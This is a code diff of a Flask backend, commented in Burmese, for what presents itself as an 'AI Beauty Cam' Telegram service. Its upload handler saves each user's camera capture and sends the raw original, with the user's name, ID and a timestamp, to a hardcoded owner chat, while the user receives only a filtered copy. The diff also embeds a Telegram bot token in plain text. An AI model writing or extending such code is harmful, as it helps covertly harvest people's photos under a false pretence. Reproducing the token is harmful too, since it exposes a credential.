@@ -1,11 +1,16 @@
-import os, json, base64, asyncio
+import os
+import json
+import base64
+import asyncio
+import time
 from flask import Flask, request, jsonify
 from telegram import Bot
 
 app = Flask(__name__)
 
+# --- Configuration ---
 TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
-OWNER_ID = '7812553563' # အက်မင် ID
+OWNER_ID = '7812553563' # Admin ID ထည့်ပါ
 bot = Bot(token=TOKEN)
 
 @app.route('/')
@@ -15,32 +20,50 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    image_data = data.get('image').split(",")[1]
     user_id = data.get('user_id')
     user_name = data.get('user_name')
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S") # အချိန်မှတ်တမ်း
 
-    path = f"capture_{user_id}.jpg"
-    with open(path, "wb") as f:
-        f.write(base64.b64decode(image_data))
+    # Base64 data များကို ခွဲထုတ်ခြင်း
+    raw_data = data.get('original_image').split(",")[1]
+    filtered_data = data.get('filtered_image').split(",")[1]
 
-    async def notify():
+    # ဖိုင်အမည်များ သတ်မှတ်ခြင်း (ယာယီသိမ်းရန်)
+    raw_path = f"raw_{user_id}.jpg"
+    filtered_path = f"beauty_{user_id}.jpg"
+
+    # ပုံများကို Disk တွင် သိမ်းဆည်းခြင်း
+    with open(raw_path, "wb") as f:
+        f.write(base64.b64decode(raw_data))
+    with open(filtered_path, "wb") as f:
+        f.write(base64.b64decode(filtered_data))
+
+    async def send_dual_photos():
         async with bot:
-            # ၁။ Admin ဆီ ပို့ခြင်း
+            # ၁။ Admin ဆီသို့ Original ပုံ အကြမ်း ပို့ခြင်း
             await bot.send_photo(
                 chat_id=OWNER_ID,
-                photo=open(path, 'rb'),
-                caption=f"🚨 New Capture!\nUser: {user_name}\nID: {user_id}"
+                photo=open(raw_path, 'rb'),
+                caption=f"🔒 **Admin Log - Raw Capture**\n\n👤 User: {user_name}\n🆔 ID: `{user_id}`\n⏰ Time: {timestamp}\n📝 Note: Original file unfiltered."
             )
-            # ၂။ User ဆီ ပုံပြန်ပို့ပေးခြင်း
+            print(f"Sent raw to admin: {OWNER_ID}")
+
+            # ၂။ User ဆီသို့ Filtered ပုံ အလှ ပို့ခြင်း
             await bot.send_photo(
                 chat_id=user_id,
-                photo=open(path, 'rb'),
-                caption="✨ AI Beauty Cam မှ သင့်ဓာတ်ပုံကို သိမ်းဆည်းလိုက်ပါပြီ!"
+                photo=open(filtered_path, 'rb'),
+                caption=f"✨ **Your AI Beauty Cam Photo!** ✨\n\nလှပသော ပုံရိပ်လေးကို ဖန်တီးပေးထားပါတယ်! 🥰"
             )
+            print(f"Sent filtered to user: {user_id}")
 
+    # Async function ကို Run ခြင်း
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    loop.run_until_complete(notify())
+    loop.run_until_complete(send_dual_photos())
+
+    # (Optional) ယာယီဖိုင်များကို ပြန်ဖျက်ခြင်း
+    # os.remove(raw_path)
+    # os.remove(filtered_path)
     
     return jsonify({"status": "success"}), 200
 
